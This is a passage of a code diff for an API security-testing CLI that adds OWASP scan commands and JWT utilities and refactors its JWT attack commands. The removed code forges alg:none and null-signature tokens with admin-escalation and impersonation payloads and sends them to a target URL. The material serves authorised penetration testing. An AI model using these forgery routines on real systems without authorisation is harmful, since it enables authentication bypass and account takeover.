+    guarantees ``scan`` and the ``full`` alias are identical (design §5).
+    """
+    func = auth_options(func)
+    func = bola_options(func)
+    func = transversal_options(func)
+    for option in reversed(_ORCHESTRATOR_EXTRA_OPTIONS):
+        func = option(func)
+    return func
+
+
+@cli.command(name='scan')
+@_orchestrator_options
+@click.pass_context
+def scan(ctx, **kwargs):
+    """Run an orchestrated OWASP scan (discovery + selected OWASP modules).
+
+    \b
+    Runs every registered OWASP module by default, or only the modules named in
+    --modules. Aggregates all findings through the unified reporting pipeline and
+    drives the CI/CD severity gate.
+
+    \b
+    Examples:
+      apileaks scan --target https://api.example.com
+      apileaks scan --config config.yaml --target URL
+      apileaks scan --target URL --modules bola,auth,property
+      apileaks scan --target URL --ci-mode --fail-on high
+    """
+    config_path = kwargs.get('config')
+    modules = kwargs.get('modules')
+    _build_and_run(
+        ctx,
+        selected_keys=_resolve_modules(modules),
+        descriptors=_selected_descriptors(modules),
+        opts=kwargs,
+        config_path=config_path,
+    )
+
+
+@cli.command(name='full', hidden=True)
+@_orchestrator_options
+@click.pass_context
+def full(ctx, **kwargs):
+    """[DEPRECATED] Alias of 'scan'. Use 'apileaks scan' instead.
+
+    Retained for backward compatibility. Emits a deprecation notice to standard
+    error and then runs identically to 'scan' (same modules, report, and exit
+    code).
+    """
+    _emit_deprecation_notice('full', 'scan')
+    if kwargs.get('modules'):
+        _emit_module_selection_deprecation(kwargs['modules'])
+    # Forward the identical parsed option surface to ``scan`` so the run and exit
+    # code are identical; the only difference is the stderr notice above
+    # (Requirements 6.1, 6.2, 6.7).
+    ctx.forward(scan)
+
+
+# ---------------------------------------------------------------------------
+# owasp command group + dynamically generated Module_Subcommands (design §4).
+#
+# One first-class subcommand is generated per OWASP_MODULE_DESCRIPTORS entry,
+# named character-for-character by the engine registration key. Each subcommand
+# stacks the shared Transversal_Options (Shared_Option_Mechanism), the
+# descriptor's own Module_Specific_Options (only when it owns any), and routes
+# into the shared _build_and_run execution core with selected_keys=[desc.key]
+# so exactly that one module runs.
+#
+# Unknown subcommand names and foreign specific options are rejected natively by
+# Click (nonzero exit) — no extra code (Requirements 1.6, 2.7, 8.5). dir/par are
+# never registered here (Requirement 8.5).
+#
+# Requirements: 1.1, 1.2, 1.3, 1.4, 1.6, 7.4, 7.5, 11.1, 11.3, 11.4
+# ---------------------------------------------------------------------------
+
+def _module_help(desc: OwaspModuleDescriptor) -> str:
+    """Build the ``--help`` description text for a module subcommand.
+
+    The base text names the OWASP category and the module summary and states
+    that the subcommand runs exactly that one module in isolation.
+
+    For the ``auth`` descriptor specifically, the help additionally states that
+    automated JWT detection during an orchestrated run is performed by the
+    JWT_Module_Tests, and points to the ``jwt`` group as the location for manual
+    JWT attacks (Requirements 7.4, 7.5).
+
+    Args:
+        desc: The descriptor whose subcommand help text is being built.
+
+    Returns:
+        The multi-paragraph help string for the subcommand.
+    """
+    base = (
+        f"[{desc.owasp_category}] {desc.summary}.\n\n"
+        f"Runs only the '{desc.key}' OWASP module against the target "
+        f"(single-module run in isolation)."
+    )
+
+    if desc.key == "auth":
+        base += (
+            "\n\n"
+            "Automated JWT detection during an orchestrated run is performed by "
+            "the JWT_Module_Tests (the algorithm-confusion and expired-token "
+            "acceptance checks governed by --public-key, --jwks-url, and "
+            "--signing-secret).\n\n"
+            "For manual JWT attacks and utilities, use the 'jwt' command group "
+            "(e.g. 'apileaks jwt --help')."
+        )
+
+    return base
+
+
+def _print_owasp_module_listing() -> None:
+    """Write one line per descriptor to stdout (Requirements 1.4, 11.4).
+
+    Each line contains the module's engine registration key, its OWASP category
+    identifier, and its single-line (<= 80 char) summary, in OWASP category
+    order (API1..API10).
+    """
+    for desc in OWASP_MODULE_DESCRIPTORS:
+        click.echo(f"{desc.key}\t{desc.owasp_category}\t{desc.summary}")
+
+
+@cli.group(invoke_without_command=True)
+@click.pass_context
+def owasp(ctx):
+    """OWASP API Security Top 10 testing modules (run one module in isolation).
+
+    Each subcommand runs exactly one registered OWASP detection module against a
+    target. Run 'apileaks owasp' with no subcommand to list every available
+    module with its OWASP category and a one-line description.
+    """
+    if ctx.invoked_subcommand is None:
+        _print_owasp_module_listing()
+        ctx.exit(0)
+
+
+def _make_module_subcommand(desc: OwaspModuleDescriptor):
+    """Build the fully decorated ``owasp`` subcommand for ``desc`` (design §4).
+
+    Stacks the decorators in this order (applied in reverse so Click composes
+    them correctly):
+
+    1. ``click.command(name=desc.key, help=_module_help(desc))`` — the command
+       named character-for-character by the engine key.
+    2. ``transversal_options`` — the Shared_Option_Mechanism.
+    3. ``desc.specific_options`` — the module's own options (only when not None).
+    4. ``click.pass_context`` — so the handler receives the Click context.
+
+    The handler routes into the shared execution core with a single selected
+    key, so exactly that one module runs (Requirement 1.3).
+
+    Args:
+        desc: The descriptor to generate a subcommand for.
+
+    Returns:
+        The fully decorated Click command.
+    """
+    decorators = [
+        click.command(name=desc.key, help=_module_help(desc)),
+        transversal_options,
+    ]
+    if desc.specific_options is not None:
+        decorators.append(desc.specific_options)
+    decorators.append(click.pass_context)
+
+    def _handler(ctx, **kwargs):
+        _build_and_run(
+            ctx, selected_keys=[desc.key], descriptors=[desc], opts=kwargs)
+
+    cmd = _handler
+    for dec in reversed(decorators):
+        cmd = dec(cmd)
+    return cmd
+
+
+# Register exactly one generated subcommand per descriptor on the owasp group,
+# then the owasp group on cli. Adding a descriptor row yields a fully wired
+# subcommand automatically (Requirements 1.2, 11.1).
+for _desc in OWASP_MODULE_DESCRIPTORS:
+    owasp.add_command(_make_module_subcommand(_desc))
+
+
+# ---------------------------------------------------------------------------
+# JWT CLI helpers — route all attack-token generation and execution through the
+# single-source-of-truth JWTAttackEngine (Requirements 14.2, 14.3) and issue
+# HTTP through the shared HTTPRequestEngine (Requirement 17.1). No subcommand
+# reimplements attack logic inline, and success is decided by the engine's
+# JWTAttackResponseAnalyzer rather than admin/dashboard keyword presence
+# (Requirement 19.2).
+# ---------------------------------------------------------------------------
+
+def _parse_custom_headers(header):
+    """Parse repeatable ``Name: Value`` header options into a dict.
+
+    Exits with an error on a malformed header, matching prior CLI behavior.
+    """
+    custom_headers = {}
+    for h in header:
+        if ':' not in h:
+            click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
+            sys.exit(1)
+        name, value = h.split(':', 1)
+        custom_headers[name.strip()] = value.strip()
+    return custom_headers
+
+
+def _build_jwt_http_engine(timeout=30, verify_ssl=True):
+    """Build a shared :class:`HTTPRequestEngine` for JWT attack requests.
+
+    Routing JWT HTTP through the shared engine applies the same rate limiting,
+    proxy, User-Agent rotation, and TLS controls as the rest of the tool
+    (Requirement 17.1).
+    """
+    from utils.http_client import HTTPRequestEngine, RateLimiter, RetryConfig
+    from core.config import RateLimitConfig
+
+    rate_limiter = RateLimiter(RateLimitConfig())
+    retry_config = RetryConfig(max_attempts=3)
+    return HTTPRequestEngine(
+        rate_limiter, retry_config, timeout=timeout, verify_ssl=verify_ssl)
+
+
+def _make_jwt_engine(token, url, custom_headers, data, http_engine=None,
+                     signing_secret=None, fuzz_target=None, fuzz_values=None,
+                     canary_value=None, public_key_material=None):
+    """Construct a :class:`JWTAttackEngine` for a CLI subcommand.
+
+    ``fuzz_target``/``fuzz_values`` drive the CLAIM_FUZZING vector (Req 63.1) and
+    ``canary_value`` corroborates — but never replaces — analyzer-based success
+    (Reqs 67.3-67.5). ``public_key_material`` supplies the target's asymmetric
+    public key (PEM/DER path or inline PEM) used by the ALGORITHM_CONFUSION
+    vector. All default to ``None`` so the single-token path is preserved
+    unchanged when no new option is supplied (Req 67.5).
+    """
+    return JWTAttackEngine(
+        target_url=url or "",
+        original_token=token,
+        http_engine=http_engine,
+        signing_secret=signing_secret,
+        public_key_material=public_key_material,
+        custom_headers=custom_headers or {},
+        post_data=data,
+        fuzz_target=fuzz_target,
+        fuzz_values=fuzz_values,
+        canary_value=canary_value,
+    )
+
+
+def _display_generated_tokens(engine, attack_type):
+    """Generate and print attack tokens for ``attack_type`` via the engine."""
+    tokens = engine.generate_token(attack_type)
+    click.echo(f"\n🎯 Generated {len(tokens)} attack token(s) via JWTAttackEngine:")
+    click.echo("-" * 55)
+    for i, tok in enumerate(tokens, 1):
+        click.echo(f"\n{i}. {tok}")
+    return tokens
+
+
+def _report_attack_result(result):
+    """Report a single :class:`AttackResult` using the analyzer's assessment.
+
+    Success is determined by the engine's :class:`JWTAttackResponseAnalyzer`
+    (baseline comparison + confidence scoring), never by keyword presence
+    (Requirements 19.1, 19.2).
+    """
+    if result is None:
+        click.echo("   ⚠️  No response obtained from the endpoint for this vector")
+        return False
+
+    assessment = result.vulnerability_assessment
+    response = result.response_details
+    click.echo(f"\n🧪 {result.attack_type.value}:")
+    click.echo(f"   Status: {response.status_code}")
+    click.echo(f"   Length: {response.content_length} bytes")
+    click.echo(f"   Confidence: {assessment.confidence_score:.2f}")
+    if result.baseline_comparison:
+        bc = result.baseline_comparison
+        click.echo(
+            f"   Baseline: {bc.get('baseline_status')} -> {bc.get('attack_status')} "
+            f"(len Δ {bc.get('content_length_diff')})")
+
+    if assessment.is_vulnerable:
+        click.echo(f"   🚨 VULNERABILITY CONFIRMED: {assessment.vulnerability_type} "
+                   f"({assessment.severity.value})")
+        for ev in assessment.evidence:
+            click.echo(f"   💀 {ev}")
+        return True
+
+    click.echo("   ✅ Attack blocked - server rejected the malicious token")
+    return False
+
+
+def _run_jwt_vector(token, attack_type, url, custom_headers, data, timeout,
+                    verify_ssl=True, signing_secret=None, public_key_material=None):
+    """Drive one JWT attack vector through the engine.
+
+    When ``url`` is provided the vector is executed against the endpoint through
+    the shared :class:`HTTPRequestEngine` and evaluated by the engine's response
+    analyzer; otherwise the generated tokens are displayed for manual testing.
+    """
+    if not url:
+        engine = _make_jwt_engine(token, url, custom_headers, data,
+                                  public_key_material=public_key_material)
+        _display_generated_tokens(engine, attack_type)
+        click.echo(f"\n⚠️  Manual Testing Required (no --url provided):")
+        click.echo("• Test each generated token against your API endpoints")
+        click.echo("• If a token is accepted, the server is vulnerable to this attack")
+        return
+
+    async def _run():
+        http_engine = _build_jwt_http_engine(timeout, verify_ssl)
+        try:
+            engine = _make_jwt_engine(
+                token, url, custom_headers, data,
+                http_engine=http_engine, signing_secret=signing_secret,
+                public_key_material=public_key_material)
+            _display_generated_tokens(engine, attack_type)
+            click.echo(f"\n🎯 Testing against endpoint: {url}")
+            result = await engine.execute_attack(attack_type)
+            _report_attack_result(result)
+        finally:
+            await http_engine.close()
+
+    asyncio.run(_run())
 
 
 # JWT Command Group
 @cli.group()
 @click.pass_context
 def jwt(ctx):
-    """JWT utilities - decode, encode, and security vulnerability testing
-    
+    """Manual JWT attack and utility toolkit - decode, encode, and security testing
+
+    \b
+    This is the manual JWT toolkit: an operator-driven set of utilities and
+    attack primitives you run by hand. It is distinct from the automated
+    JWT_Module_Tests performed during an orchestrated OWASP run (see the
+    'owasp auth' subcommand).
+
     \b
     JWT Security Testing includes:
     • Token decoding and analysis
@@ -2851,8 +4312,10 @@ def jwt(ctx):
     Available Commands:
       decode              Decode and analyze JWT tokens
       encode              Create JWT tokens with custom payloads
+      verify              Verify a token signature against key material (no network)
       test-alg-none       Test algorithm confusion (alg:none) attacks
       test-null-signature Test null signature bypass attacks
+      test-alg-confusion  Test RS256/ES256 -> HS256 key confusion (substitution)
       brute-secret        Brute-force weak HMAC secrets
       test-kid-injection  Test Key ID (kid) injection vulnerabilities
       test-jwks-spoof     Test JWKS URL spoofing attacks
@@ -2929,15 +4392,189 @@ def jwt_encode_cmd(ctx, payload, header, secret):
         click.echo("JWT Token Generated")
         click.echo("="*60)
         click.echo(f"\n🔑 Secret Used: {secret}")
-        click.echo(f"📋 Header: {json.dumps(header_dict)}")
-        click.echo(f"🔐 Payload: {json.dumps(payload_dict)}")
-        click.echo(f"\n🎫 Generated Token:")
+        click.echo("📋 Header: " + click.style(json.dumps(header_dict), fg=JWT_HEADER_COLOR))
+        click.echo("🔐 Payload: " + click.style(json.dumps(payload_dict), fg=JWT_PAYLOAD_COLOR))
+        click.echo(f"\n🎫 Generated Token (colour-coded by section):")
         click.echo("-" * 20)
-        click.echo(token)
+        click.echo(colorize_jwt(decode_jwt(token)))
+        click.echo("  " + click.style("■ header", fg=JWT_HEADER_COLOR, bold=True)
+                   + "  " + click.style("■ payload", fg=JWT_PAYLOAD_COLOR, bold=True)
+                   + "  " + click.style("■ signature", fg=JWT_SIGNATURE_COLOR, bold=True))
         click.echo("\n" + "="*60)
         
     except ValueError as e:
         click.echo(f"❌ Error encoding JWT: {e}", err=True)
+        sys.exit(1)
+    except Exception as e:
+        click.echo(f"❌ Unexpected error: {e}", err=True)
+        sys.exit(1)
+
+
+@jwt.command('verify')
+@click.argument('token')
+@click.option('--secret', help='Shared secret for HMAC (HS*) verification')
+@click.option('--key-file', type=click.Path(), help='Path to a PEM/DER public key or certificate file')
+@click.option('--pem', help='Inline PEM public key or certificate material')
+@click.option('--jwks', 'jwks_file', type=click.Path(),
+              help='Path to a JWKS file (single JWK entry or {"keys": [...]})')
+@click.pass_context
+def jwt_verify_cmd(ctx, token, secret, key_file, pem, jwks_file):
+    """Verify a JWT signature against supplied key material (network-free)
+
+    Dispatches on the token header algorithm: HS* uses the shared --secret,
+    while RS*/PS*/ES* use the public key from --key-file, --pem, or --jwks.
+    No HTTP request is issued (Requirement 65.3).
+
+    \b
+    Examples:
+      python apileaks.py jwt verify TOKEN --secret mysecret
+      python apileaks.py jwt verify TOKEN --key-file public.pem
+      python apileaks.py jwt verify TOKEN --pem "$(cat public.pem)"
+      python apileaks.py jwt verify TOKEN --jwks jwks.json
+    """
+    try:
+        # A JWKS source is read locally (no network, Req 65.3) and converted
+        # via reconstruct_public_key_from_jwks inside verify_token. A read/parse
+        # failure names the offending key source (Req 65.4).
+        jwks_dict = None
+        if jwks_file is not None:
+            try:
+                with open(jwks_file, 'r') as fh:
+                    jwks_dict = json.loads(fh.read())
+            except FileNotFoundError:
+                raise ValueError(f"Could not read JWKS file '{jwks_file}': file not found")
+            except json.JSONDecodeError as exc:
+                raise ValueError(f"Could not parse JWKS file '{jwks_file}': {exc}")
+            except OSError as exc:
+                raise ValueError(f"Could not read JWKS file '{jwks_file}': {exc}")
+
+        result = verify_token(
+            token,
+            secret=secret,
+            key_file=key_file,
+            pem=pem,
+            jwks=jwks_dict,
+        )
+
+        status = "✅ VALID" if result.valid else "❌ INVALID"
+        click.echo("\n" + "=" * 60)
+        click.echo("JWT Signature Verification")
+        click.echo("=" * 60)
+        click.echo(f"\n🔎 Algorithm: {result.algorithm}")
+        click.echo(f"🔑 Key Source: {result.key_source}")
+        click.echo(f"📋 Signature: {status}")
+        click.echo("\n" + "=" * 60)
+
+        # A failed verification is a reported result, not an error condition.
+        sys.exit(0 if result.valid else 1)
+
+    except ValueError as e:
+        click.echo(f"❌ Error verifying JWT: {e}", err=True)
+        sys.exit(1)
+    except Exception as e:
+        click.echo(f"❌ Unexpected error: {e}", err=True)
+        sys.exit(1)
+
+
+@jwt.command('genkey')
+@click.option('--type', 'key_type', type=click.Choice(['rsa', 'ec']), default='rsa',
+              show_default=True, help='Keypair type to generate')
+@click.option('--bits', type=int, default=2048, show_default=True,
+              help='RSA modulus size in bits (used when --type rsa)')
+@click.option('--curve', type=click.Choice(['ES256', 'ES384', 'ES512']), default='ES256',
+              show_default=True, help='EC curve/algorithm (used when --type ec)')
+@click.pass_context
+def jwt_genkey_cmd(ctx, key_type, bits, curve):
+    """Generate a test RSA or EC keypair and emit the PEM material (local-only)
+
+    No HTTP request is issued (Requirement 66.4). Emits both the generated
+    private and public key material (Requirement 66.1).
+
+    \b
+    Examples:
+      python apileaks.py jwt genkey --type rsa
+      python apileaks.py jwt genkey --type rsa --bits 4096
+      python apileaks.py jwt genkey --type ec --curve ES256
+    """
+    try:
+        if key_type == 'rsa':
+            private_pem, public_pem = generate_rsa_keypair(bits=bits)
+            label = f"RSA {bits}-bit"
+        else:
+            private_pem, public_pem = generate_ec_keypair(curve=curve)
+            label = f"EC {curve}"
+
+        click.echo("\n" + "=" * 60)
+        click.echo(f"Generated {label} keypair")
+        click.echo("=" * 60)
+        click.echo("\n🔑 Private Key (PEM):\n")
+        click.echo(private_pem.strip())
+        click.echo("\n📢 Public Key (PEM):\n")
+        click.echo(public_pem.strip())
+        click.echo("\n" + "=" * 60)
+        sys.exit(0)
+
+    except ValueError as e:
+        click.echo(f"❌ Error generating keypair: {e}", err=True)
+        sys.exit(1)
+    except Exception as e:
+        click.echo(f"❌ Unexpected error: {e}", err=True)
+        sys.exit(1)
+
+
+@jwt.command('jwks-to-key')
+@click.option('--jwks', 'jwks_file', type=click.Path(), required=True,
+              help='Path to a JWKS file (single JWK entry or {"keys": [...]})')
+@click.pass_context
+def jwt_jwks_to_key_cmd(ctx, jwks_file):
+    """Reconstruct a public key PEM from a local JWKS entry (network-free)
+
+    Converts RSA n/e or EC crv/x/y parameters into a usable public key
+    (Requirement 66.2) reusing the same JWK-to-key conversion as the attack
+    engine (Requirement 66.3). No HTTP request is issued (Requirement 66.4).
+    Unparseable or parameter-missing input is rejected with a descriptive
+    error (Requirement 66.5).
+
+    \b
+    Examples:
+      python apileaks.py jwt jwks-to-key --jwks jwks.json
+    """
+    try:
+        # The JWKS file is read locally (no network, Req 66.4). A read/parse
+        # failure names the offending source (Req 66.5).
+        try:
+            with open(jwks_file, 'r') as fh:
+                jwks_data = json.loads(fh.read())
+        except FileNotFoundError:
+            raise ValueError(f"Could not read JWKS file '{jwks_file}': file not found")
+        except json.JSONDecodeError as exc:
+            raise ValueError(f"Could not parse JWKS file '{jwks_file}': {exc}")
+        except OSError as exc:
+            raise ValueError(f"Could not read JWKS file '{jwks_file}': {exc}")
+
+        # Accept either a full JWKS ({"keys": [...]}) or a single JWK entry.
+        if isinstance(jwks_data, dict) and 'keys' in jwks_data:
+            keys = jwks_data.get('keys')
+            if not isinstance(keys, list) or not keys:
+                raise ValueError(
+                    f"JWKS file '{jwks_file}' contains no key entries to reconstruct"
+                )
+            jwk = keys[0]
+        else:
+            jwk = jwks_data
+
+        public_pem = reconstruct_public_key_from_jwks(jwk)
+
+        click.echo("\n" + "=" * 60)
+        click.echo("Reconstructed Public Key from JWKS")
+        click.echo("=" * 60)
+        click.echo("\n📢 Public Key (PEM):\n")
+        click.echo(public_pem.strip())
+        click.echo("\n" + "=" * 60)
+        sys.exit(0)
+
+    except ValueError as e:
+        click.echo(f"❌ Error reconstructing public key: {e}", err=True)
         sys.exit(1)
     except Exception as e:
         click.echo(f"❌ Unexpected error: {e}", err=True)
@@ -2982,166 +4619,38 @@ def jwt_test_alg_none(ctx, token, payload, url, header, data, timeout):
         click.echo("="*45)
         click.echo("🔥 SEVERITY: CRITICAL - Authentication Completely Nullified")
         click.echo("")
-        
-        # Parse custom headers
-        custom_headers = {}
-        for h in header:
-            if ':' not in h:
-                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
-                sys.exit(1)
-            name, value = h.split(':', 1)
-            custom_headers[name.strip()] = value.strip()
-        
-        # Decode original token
+
+        custom_headers = _parse_custom_headers(header)
+
+        # Decode original token for display
         decoded = decode_jwt(token)
         click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
         click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
         click.echo("")
-        
-        # 1️⃣ & 2️⃣ Create alg:none version with no signature
-        click.echo("1️⃣ Rewriting header algorithm to 'none'...")
-        new_header = {"alg": "none", "typ": "JWT"}
-        
-        # 3️⃣ Create malicious payloads
-        click.echo("3️⃣ Creating malicious payloads...")
-        
-        attack_payloads = []
-        
-        # Use custom payload if provided
+
+        # Route generation + execution through the single-source-of-truth engine
+        # (Requirements 14.2, 14.3, 17.1, 19.2). If a custom payload is supplied
+        # it is merged onto the base token before running the vector.
+        base_token = token
         if payload:
             try:
                 custom_payload = json.loads(payload)
-                attack_payloads.append(("Custom Payload", custom_payload))
             except json.JSONDecodeError:
                 click.echo(f"❌ Invalid JSON payload: {payload}")
                 return
-        
-        # Create privilege escalation payloads
-        original_payload = copy.deepcopy(decoded['payload'])
-        
-        # Admin privilege escalation
-        admin_payload = copy.deepcopy(original_payload)
-        admin_payload.update({
-            'sub': 'admin',
-            'role': 'admin', 
-            'admin': True,
-            'is_admin': True,
-            'scope': 'admin read write delete',
-            'privileges': ['admin', 'superuser']
-        })
-        attack_payloads.append(("Admin Privilege Escalation", admin_payload))
-        
-        # User impersonation
-        if 'sub' in original_payload and original_payload['sub'] != 'admin':
-            impersonation_payload = copy.deepcopy(original_payload)
-            impersonation_payload['sub'] = 'admin'
-            impersonation_payload['username'] = 'admin'
-            impersonation_payload['user_id'] = '1'
-            attack_payloads.append(("User Impersonation", impersonation_payload))
-        
-        # Extended expiration
-        if 'exp' in original_payload:
-            import time
-            extended_payload = copy.deepcopy(original_payload)
-            extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
-            attack_payloads.append(("Extended Expiration", extended_payload))
-        
-        # Generate attack tokens
-        attack_tokens = []
-        import base64
-        
-        for attack_name, attack_payload in attack_payloads:
-            # 4️⃣ Create unsigned token (alg:none)
-            header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
-            payload_b64 = base64.urlsafe_b64encode(json.dumps(attack_payload).encode()).decode().rstrip('=')
-            
-            # alg:none tokens should have empty signature
-            unsigned_token = f"{header_b64}.{payload_b64}."
-            attack_tokens.append((attack_name, unsigned_token, attack_payload))
-            
-            click.echo(f"✅ Generated {attack_name} token")
-        
-        # Display generated tokens
-        click.echo(f"\n🎯 Generated alg:none Attack Tokens:")
-        click.echo("-" * 50)
-        for i, (name, token_val, payload_info) in enumerate(attack_tokens, 1):
-            click.echo(f"\n{i}. {name}:")
-            click.echo(f"   Token: {token_val}")
-            click.echo(f"   Payload: {json.dumps(payload_info)}")
-        
-        # 5️⃣ Test against real endpoint if URL provided
-        if url and attack_tokens:
-            click.echo(f"\n5️⃣ Testing privileged access against real endpoint...")
-            click.echo(f"🎯 Target: {url}")
-            
-            import asyncio
-            import httpx
-            
-            async def test_endpoint(token_name, token_value, payload_info):
-                try:
-                    headers = {'Authorization': f'Bearer {token_value}'}
-                    headers.update(custom_headers)
-                    
-                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
-                        if data:
-                            response = await client.post(url, headers=headers, data=data)
-                        else:
-                            response = await client.get(url, headers=headers)
-                        
-                        click.echo(f"\n🧪 {token_name} Test:")
-                        click.echo(f"   Status: {response.status_code}")
-                        click.echo(f"   Length: {len(response.text)} bytes")
-                        
-                        # Check for success indicators
-                        success_indicators = []
-                        if response.status_code in [200, 201, 202]:
-                            success_indicators.append("2xx Success Status")
-                        
-                        response_text = response.text.lower()
-                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'welcome']):
-                            success_indicators.append("Privileged Content Detected")
-                        
-                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
-                            success_indicators.append("No Error Messages")
-                        
-                        if success_indicators:
-                            click.echo(f"   🚨 CRITICAL VULNERABILITY CONFIRMED!")
-                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
-                            click.echo(f"   💀 Server accepted unsigned token!")
-                            click.echo(f"   💀 Payload used: {json.dumps(payload_info)}")
-                        else:
-                            click.echo(f"   ✅ Attack blocked - server properly rejects alg:none")
-                            
-                except Exception as e:
-                    click.echo(f"   ❌ Request failed: {e}")
-            
-            # Test all attack tokens
-            async def run_all_tests():
-                for token_name, token_value, payload_info in attack_tokens:
-                    await test_endpoint(token_name, token_value, payload_info)
-            
-            asyncio.run(run_all_tests())
-        
-        else:
-            click.echo(f"\n⚠️  Manual Testing Required:")
-            click.echo("• Test each token against your API endpoints")
-            click.echo("• If ANY token is accepted, the server is CRITICALLY vulnerable")
-            click.echo("• Proper JWT libraries should REJECT all alg:none tokens")
-        
-        # Summary and recommendations
-        click.echo(f"\n" + "="*60)
-        click.echo("🔥 ATTACK SUMMARY")
-        click.echo("="*60)
-        click.echo(f"✅ Attack tokens generated: {len(attack_tokens)}")
-        if url:
-            click.echo(f"✅ Endpoint testing completed")
-        
+            merged = copy.deepcopy(decoded['payload'])
+            merged.update(custom_payload)
+            base_token = encode_jwt(decoded['header'], merged, 'secret')
+
+        _run_jwt_vector(base_token, AttackType.ALG_NONE, url, custom_headers,
+                        data, timeout)
+
         click.echo(f"\n💡 REMEDIATION:")
         click.echo("• Configure JWT library to REJECT alg:none tokens")
         click.echo("• Implement algorithm whitelist (e.g., only allow HS256, RS256)")
         click.echo("• Never trust the algorithm specified in JWT header")
         click.echo("• Use proper JWT validation libraries, not custom implementations")
-        
+
     except Exception as e:
         click.echo(f"❌ Error: {e}", err=True)
         sys.exit(1)
@@ -3183,170 +4692,129 @@ def jwt_test_null_signature(ctx, token, payload, url, header, data, timeout):
         click.echo("="*40)
         click.echo("🔥 SEVERITY: CRITICAL - Cryptographic Validation Bypass")
         click.echo("")
-        
-        # Parse custom headers
-        custom_headers = {}
-        for h in header:
-            if ':' not in h:
-                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
-                sys.exit(1)
-            name, value = h.split(':', 1)
-            custom_headers[name.strip()] = value.strip()
-        
-        # Decode original token
+
+        custom_headers = _parse_custom_headers(header)
+
+        # Decode original token for display
         decoded = decode_jwt(token)
         click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
         click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
         click.echo("")
-        
-        # 2️⃣ Create malicious payloads
-        click.echo("2️⃣ Creating malicious payloads...")
-        
-        attack_payloads = []
-        
-        # Use custom payload if provided
+
+        # Route generation + execution through the single-source-of-truth engine
+        # (Requirements 14.2, 14.3, 17.1, 19.2). A custom payload is merged onto
+        # the base token before running the vector.
+        base_token = token
         if payload:
             try:
                 custom_payload = json.loads(payload)
-                attack_payloads.append(("Custom Payload", custom_payload))
             except json.JSONDecodeError:
                 click.echo(f"❌ Invalid JSON payload: {payload}")
                 return
-        
-        # Create privilege escalation payloads
-        original_payload = copy.deepcopy(decoded['payload'])
-        
-        # Admin privilege escalation
-        admin_payload = copy.deepcopy(original_payload)
-        admin_payload.update({
-            'sub': 'admin',
-            'role': 'admin', 
-            'admin': True,
-            'is_admin': True,
-            'scope': 'admin read write delete',
-            'privileges': ['admin', 'superuser']
-        })
-        attack_payloads.append(("Admin Privilege Escalation", admin_payload))
-        
-        # User impersonation
-        if 'sub' in original_payload and original_payload['sub'] != 'admin':
-            impersonation_payload = copy.deepcopy(original_payload)
-            impersonation_payload['sub'] = 'admin'
-            impersonation_payload['username'] = 'admin'
-            impersonation_payload['user_id'] = '1'
-            attack_payloads.append(("User Impersonation", impersonation_payload))
-        
-        # Extended expiration
-        if 'exp' in original_payload:
-            import time
-            extended_payload = copy.deepcopy(original_payload)
-            extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
-            attack_payloads.append(("Extended Expiration", extended_payload))
-        
-        # 1️⃣ Create tokens with different null signature variations
-        click.echo("1️⃣ Creating null signature variants...")
-        
-        attack_tokens = []
-        import base64
-        
-        for attack_name, attack_payload in attack_payloads:
-            header_b64 = base64.urlsafe_b64encode(json.dumps(decoded['header']).encode()).decode().rstrip('=')
-            payload_b64 = base64.urlsafe_b64encode(json.dumps(attack_payload).encode()).decode().rstrip('=')
-            
-            # Create different null signature variations
-            variations = [
-                (f"{attack_name} - Empty Signature", f"{header_b64}.{payload_b64}."),
-                (f"{attack_name} - No Signature Section", f"{header_b64}.{payload_b64}"),
-                (f"{attack_name} - Literal Null", f"{header_b64}.{payload_b64}.null"),
-                (f"{attack_name} - Empty Object", f"{header_b64}.{payload_b64}." + "{}"),
-                (f"{attack_name} - Zero Signature", f"{header_b64}.{payload_b64}.0"),
-            ]
-            
-            for variant_name, variant_token in variations:
-                attack_tokens.append((variant_name, variant_token, attack_payload))
-        
-        click.echo(f"✅ Generated {len(attack_tokens)} null signature variants")
-        
-        # Display generated tokens
-        click.echo(f"\n🎯 Generated Null Signature Attack Tokens:")
-        click.echo("-" * 55)
-        for i, (name, token_val, payload_info) in enumerate(attack_tokens, 1):
-            click.echo(f"\n{i}. {name}")
-            click.echo(f"   Token: {token_val}")
-        
-        # 3️⃣ & 4️⃣ Test against real endpoint if URL provided
-        if url and attack_tokens:
-            click.echo(f"\n3️⃣ Testing against protected endpoint...")
-            click.echo(f"🎯 Target: {url}")
-            
-            import asyncio
-            import httpx
-            
-            async def test_endpoint(token_name, token_value, payload_info):
-                try:
-                    headers = {'Authorization': f'Bearer {token_value}'}
-                    headers.update(custom_headers)
-                    
-                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
-                        if data:
-                            response = await client.post(url, headers=headers, data=data)
-                        else:
-                            response = await client.get(url, headers=headers)
-                        
-                        click.echo(f"\n🧪 {token_name}:")
-                        click.echo(f"   Status: {response.status_code}")
-                        click.echo(f"   Length: {len(response.text)} bytes")
-                        
-                        # Check for success indicators
-                        success_indicators = []
-                        if response.status_code in [200, 201, 202]:
-                            success_indicators.append("2xx Success Status")
-                        
-                        response_text = response.text.lower()
-                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'welcome']):
-                            success_indicators.append("Privileged Content Detected")
-                        
-                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
-                            success_indicators.append("No Error Messages")
-                        
-                        if success_indicators:
-                            click.echo(f"   🚨 CRITICAL VULNERABILITY CONFIRMED!")
-                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
-                            click.echo(f"   💀 Server accepted token with null signature!")
